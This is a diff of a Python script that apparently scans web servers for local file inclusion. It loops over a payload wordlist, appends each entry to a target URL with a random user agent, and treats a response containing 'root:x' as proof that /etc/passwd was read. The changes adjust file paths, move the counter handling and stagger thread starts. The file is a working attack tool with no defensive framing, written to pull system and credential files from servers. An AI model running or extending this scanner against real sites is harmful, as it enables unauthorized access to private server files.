@@ -2,8 +2,8 @@ import requests, socket, sys, argparse, random, threading, OpenSSL,time
 from bs4 import BeautifulSoup
 
 
-LFI = [lfi.strip() for lfi in open("LFİ LİST")]
-USERAGENT = [agent.strip() for agent in open('USER AGENT LİST')]
+LFI = [lfi.strip() for lfi in open("/Users/mehmetserifpasa/Desktop/python-denemeler/brsurdp/files/lfi.txt")]
+USERAGENT = [agent.strip() for agent in open('/Users/mehmetserifpasa/Desktop/python-denemeler/brsurdp/files/user-agents.txt')]
 
 
 CYAN = '\033[36m'
@@ -29,10 +29,11 @@ def output(put):
 # SCANNER DEF
 say = 0
 def scanner():
+    global LFI
+    global say
+    global USERAGENT
+    say += 1
     try:
-        global LFI
-        global say
-        global USERAGENT
         req = requests.get(url+LFI[say],headers={'User-Agent':random.choice(USERAGENT)})
         req_Text = req.text
         if "root:x" in req_Text:
@@ -42,7 +43,7 @@ def scanner():
 
         else:
             pass
-        say +=1
+
         print(req.url+" -- status_code:"+str(len(req_Text)))
     except requests.exceptions.ConnectionError:
         pass
@@ -59,7 +60,22 @@ for thr in range(len(LFI)-1):
 
 for thr1 in thread:
     thr1.start()
-    thr1.join()
+    time.sleep(0.05)
+
+for thr2 in thread:
+    thr2.join()
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
